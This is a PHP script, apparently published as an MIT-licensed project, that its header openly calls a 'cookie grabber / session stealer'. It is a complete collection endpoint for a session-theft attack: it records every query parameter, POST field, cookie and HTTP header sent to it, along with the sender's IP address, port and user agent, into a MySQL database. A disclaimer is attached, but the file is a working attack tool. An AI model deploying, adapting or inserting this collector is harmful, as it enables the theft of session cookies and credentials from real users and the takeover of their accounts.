<?php

//
// data-grabber - v1.0 (2018-05-01)
// 
// This is a simple PHP script that can be used as a cookie grabber / session stealer.
// It uses MySQL to store data in a structured way (please see the data definition script).
//
// DISCLAIMER: Please use this tool responsibly. I do not take responsibility for the way in 
// which any one uses this application. I am NOT responsible for any damages caused or any 
// crimes committed by using this tool.
// 
// Author: Antonio Francesco Sardella (https://github.com/m3ssap0).
// 
// This project is licensed under the MIT License.
//

// Database connection parameters.
$db_server_name = ''; // Put your configuration here.
$db_username    = ''; // Put your configuration here.
$db_password    = ''; // Put your configuration here.
$db_name        = ''; // Put your configuration here.

// Database queries.
$insert_grabbed_request = 'INSERT INTO grabbed_request (request_method, ip_remote_addr, ip_forwarded_for, remote_port, user_agent) VALUES (?, ?, ?, ?, ?)';
$insert_grabbed_content = 'INSERT INTO grabbed_content (grabbed_content_fk, content_type, content_key, content_value) VALUES (?, ?, ?, ?)';

// Checking the presence of data.
if(sizeof($_GET) < 1 && sizeof($_POST) < 1) {
   die('No data!');
} else {

   // Creating database connection.
   $conn = new mysqli($db_server_name, $db_username, $db_password, $db_name);
   if ($conn->connect_error) {
      die('Error in connecting to the database!');
   }

   // Determining the HTTP request method.
   $request_method = 'UNKNOWN';
   if(isset($_SERVER['REQUEST_METHOD'])) {
      $request_method = $conn->real_escape_string($_SERVER['REQUEST_METHOD']);
   }
   
   // Determining the remote IP addresses.
   $ip_remote_addr = NULL;
   if(isset($_SERVER['REMOTE_ADDR'])) {
      $ip_remote_addr = $conn->real_escape_string($_SERVER['REMOTE_ADDR']);
   }
   $ip_forwarded_for = NULL;
   if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip_forwarded_for = $conn->real_escape_string($_SERVER['HTTP_X_FORWARDED_FOR']);
   }
   
   // Determining the remote port.
   $remote_port = NULL;
   if(isset($_SERVER['REMOTE_PORT'])) {
      $remote_port = $conn->real_escape_string($_SERVER['REMOTE_PORT']);
   }
   
   // Determining the user agent.
   $user_agent = NULL;
   if(isset($_SERVER['HTTP_USER_AGENT'])) {
	  $user_agent = $conn->real_escape_string($_SERVER['HTTP_USER_AGENT']);
   }
   
   // Inserting grabbed request data into database.
   $stmt = $conn->prepare($insert_grabbed_request);
   $stmt->bind_param('sssss', $request_method, $ip_remote_addr, $ip_forwarded_for, $remote_port, $user_agent);
   if ($stmt->execute() === FALSE) {
      die('Error in inserting request data into database!');
   }
   $request_id = $conn->insert_id;
   
   // Preparing the grabbed content query.
   $stmt = $conn->prepare($insert_grabbed_content);
   
   // Inserting grabbed content data into database.
   $headers = getallheaders();
   $data_content = array('QUERY_PARAMETER' => $_GET, 'BODY_PARAMETER' => $_POST, 'COOKIE' => $_COOKIE, 'HEADER' => $headers);
   foreach($data_content as $data_content_type => $data_content_array) {
      if(sizeof($data_content_array) > 0) {
         foreach($data_content_array as $key => $value) {
            $stmt->bind_param('dsss', $request_id, $data_content_type, $conn->real_escape_string($key), $conn->real_escape_string($value));
            if ($stmt->execute() === FALSE) {
               die('Error in inserting request content into database!');
            }
         }
      }
   }
   
   // Closing database connection.
   $conn->close();
   
   echo 'Data correctly inserted.';
}

?>